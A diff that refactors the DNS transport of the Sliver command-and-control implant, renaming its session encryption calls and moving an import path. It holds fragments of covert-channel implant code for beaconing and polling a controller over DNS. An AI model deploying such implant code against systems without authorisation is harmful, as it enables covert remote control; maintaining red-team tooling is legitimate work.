@@ -45,7 +45,7 @@ import (
 	"time"
 
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
-	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
@@ -259,7 +259,7 @@ func DnsConnect(parentDomain string) (string, cryptography.AESKey, error) {
 		// {{end}}
 		return "", cryptography.AESKey{}, errors.New("failed to decode session id")
 	}
-	sessionID, err := cryptography.GCMDecrypt(sessionKey, encryptedSessionIDData)
+	sessionID, err := cryptography.AESDecrypt(sessionKey, encryptedSessionIDData)
 	if err != nil {
 		return "", cryptography.AESKey{}, errors.New("failed to decrypt session id")
 	}
@@ -335,7 +335,7 @@ func SendEnvelope(parentDomain string, sessionID string, sessionKey cryptography
 		return
 	}
 
-	encryptedEnvelope, err := cryptography.GCMEncrypt(sessionKey, envelopeData)
+	encryptedEnvelope, err := cryptography.AESEncrypt(sessionKey, envelopeData)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to encrypt session envelope %v", err)
@@ -386,7 +386,7 @@ func Poll(parentDomain string, sessionID string, sessionKey cryptography.AESKey,
 			if isReplayAttack(rawTxt) {
 				break
 			}
-			pollData, err := cryptography.GCMDecrypt(sessionKey, rawTxt)
+			pollData, err := cryptography.AESDecrypt(sessionKey, rawTxt)
 			if err != nil {
 				strTxt := string(rawTxt[:])
 				// {{if .Config.Debug}}
@@ -428,7 +428,7 @@ func getSessionEnvelope(parentDomain string, sessionKey cryptography.AESKey, blo
 		// {{end}}
 		return nil
 	}
-	envelopeData, err := cryptography.GCMDecrypt(sessionKey, blockData)
+	envelopeData, err := cryptography.AESDecrypt(sessionKey, blockData)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Failed to decrypt block with id = %s (%v)", blockPtr.ID, err)
